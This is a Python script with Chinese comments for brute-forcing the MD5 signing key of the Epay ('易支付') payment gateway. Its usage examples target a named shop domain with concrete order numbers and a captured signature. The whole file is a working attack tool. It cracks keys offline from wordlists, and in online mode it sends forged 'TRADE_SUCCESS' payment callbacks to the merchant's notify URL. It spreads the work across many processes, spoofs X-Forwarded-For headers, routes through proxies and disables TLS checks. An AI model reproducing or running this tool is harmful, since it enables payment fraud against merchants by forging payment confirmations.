#!/usr/bin/env python3
"""
易支付 MD5 KEY 多进程爆破 / 验签。

示例:
  # 离线验签（从支付页参数）
  python3 epay_key_brute.py --wordlist /data/wordlists/epay/epay-keys-top.txt \\
    --pid 196 --type wxpay --money 120.96 --out-trade-no 441260704033551874 \\
    --notify-url 'https://zhanghao9.com/user/api/order/callback.Epay' \\
    --return-url 'https://zhanghao9.com/user/index/query?tradeNo=441260704033551874' \\
    --name 441260704033551874 --sitename 441260704033551874 \\
    --target-sign b74c178b68015a8919ba88954aa240dd

  # 在线回调探测（找到 KEY 后服务器返回非 sign error）
  python3 epay_key_brute.py --online --callback 'https://zhanghao9.com/user/api/order/callback.Epay' \\
    --wordlist /data/wordlists/epay/epay-keys-top.txt --pid 196 --money 5.46 \\
    --out-trade-no 903260704032647527 --workers 32
"""
from __future__ import annotations

import argparse
import hashlib
import multiprocessing as mp
import time
from pathlib import Path
from typing import Iterable

import requests

from faka_common import DEFAULT_UA, ensure_out, load_wordlist, log, random_xff_headers, save_hit

SIGN_PATTERNS = ("sorted_amp_key", "sorted_amp_append", "type2", "simple")


def build_params(args: argparse.Namespace) -> dict[str, str]:
    return {
        "money": str(args.money),
        "name": args.name or args.out_trade_no,
        "notify_url": args.notify_url or "",
        "out_trade_no": args.out_trade_no,
        "pid": str(args.pid),
        "return_url": args.return_url or "",
        "sitename": args.sitename or args.out_trade_no,
        "type": args.type,
    }


def md5_sign(params: dict[str, str], key: str, pattern: str) -> str:
    items = sorted((k, v) for k, v in params.items() if v not in ("", None))
    if pattern == "sorted_amp_key":
        base = "&".join(f"{k}={v}" for k, v in items) + "&key=" + key
    elif pattern == "sorted_amp_append":
        base = "&".join(f"{k}={v}" for k, v in items) + key
    elif pattern == "type2":
        # pid+type+out_trade_no+money+key
        base = f"{params['pid']}{params['type']}{params['out_trade_no']}{params['money']}{key}"
    else:
        base = f"{params['pid']}{params['out_trade_no']}{params['money']}{key}"
    return hashlib.md5(base.encode()).hexdigest()


def verify_offline(params: dict[str, str], key: str, target: str) -> str | None:
    for p in SIGN_PATTERNS:
        if md5_sign(params, key, p) == target.lower():
            return p
    return None


def verify_online(callback: str, params: dict[str, str], key: str, timeout: int, proxy: str = "", use_xff: bool = False) -> bool:
    sign = md5_sign(params, key, "sorted_amp_key")
    data = {**params, "trade_no": "probe", "trade_status": "TRADE_SUCCESS", "sign": sign, "sign_type": "MD5"}
    headers = {"User-Agent": DEFAULT_UA}
    if use_xff:
        headers.update(random_xff_headers())
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.post(callback, data=data, timeout=timeout, headers=headers, proxies=proxies, verify=False)
        body = r.text.lower()
        if "sign error" in body or "sign_error" in body:
            return False
        if r.headers.get("content-type", "").startswith("application/json"):
            j = r.json()
            if j.get("code") not in (0, None) and "sign" not in str(j.get("msg", "")).lower():
                return True
        return "success" in body or "fail" in body
    except Exception:
        return False


def worker_chunk(
    chunk: list[str],
    params: dict[str, str],
    target_sign: str,
    online: bool,
    callback: str,
    timeout: int,
    out_file: str,
    proxy: str,
    use_xff: bool,
) -> str | None:
    for key in chunk:
        if online:
            if verify_online(callback, params, key, timeout, proxy, use_xff):
                save_hit(Path(out_file), "epay_key_online", {"key": key, "callback": callback})
                return key
        else:
            pat = verify_offline(params, key, target_sign)
            if pat:
                save_hit(Path(out_file), "epay_key_offline", {"key": key, "pattern": pat, "sign": target_sign})
                return key
    return None


def chunked(it: Iterable[str], size: int) -> Iterable[list[str]]:
    buf: list[str] = []
    for x in it:
        buf.append(x)
        if len(buf) >= size:
            yield buf
            buf = []
    if buf:
        yield buf


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="易支付 MD5 KEY 爆破")
    ap.add_argument("--wordlist", default="/data/wordlists/epay/epay-keys-top.txt")
    ap.add_argument("--workers", type=int, default=mp.cpu_count())
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--limit", type=int, default=0, help="0=不限")
    ap.add_argument("--chunk", type=int, default=5000)
    ap.add_argument("--out", default="/data/tools/faka/out/epay_hits.jsonl")
    ap.add_argument("--pid", required=True)
    ap.add_argument("--type", default="wxpay")
    ap.add_argument("--money", required=True)
    ap.add_argument("--out-trade-no", required=True)
    ap.add_argument("--notify-url", default="")
    ap.add_argument("--return-url", default="")
    ap.add_argument("--name", default="")
    ap.add_argument("--sitename", default="")
    ap.add_argument("--target-sign", default="", help="离线模式必填")
    ap.add_argument("--online", action="store_true")
    ap.add_argument("--callback", default="", help="在线模式回调 URL")
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--proxy", default="")
    ap.add_argument("--xff", action="store_true")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    if args.online and not args.callback:
        raise SystemExit("在线模式需要 --callback")
    if not args.online and not args.target_sign:
        raise SystemExit("离线模式需要 --target-sign")

    params = build_params(args)
    ensure_out(args.out)
    limit = args.limit or None
    words = list(load_wordlist(args.wordlist, offset=args.offset, limit=limit))
    log(f"加载 {len(words):,} 个 KEY | workers={args.workers} | mode={'online' if args.online else 'offline'}")

    start = time.time()
    found = None
    with mp.Pool(args.workers) as pool:
        jobs = []
        for chunk in chunked(words, args.chunk):
            jobs.append(
                pool.apply_async(
                    worker_chunk,
                    (chunk, params, args.target_sign, args.online, args.callback, args.timeout, args.out, args.proxy, args.xff),
                )
            )
        for j in jobs:
            r = j.get()
            if r:
                found = r
                pool.terminate()
                break

    elapsed = time.time() - start
    rate = len(words) / elapsed if elapsed else 0
    if found:
        log(f"[+] KEY FOUND: {found} ({elapsed:.1f}s, {rate:,.0f}/s)")
    else:
        log(f"[-] 未命中 ({elapsed:.1f}s, {rate:,.0f}/s) -> {args.out}")


if __name__ == "__main__":
    main()
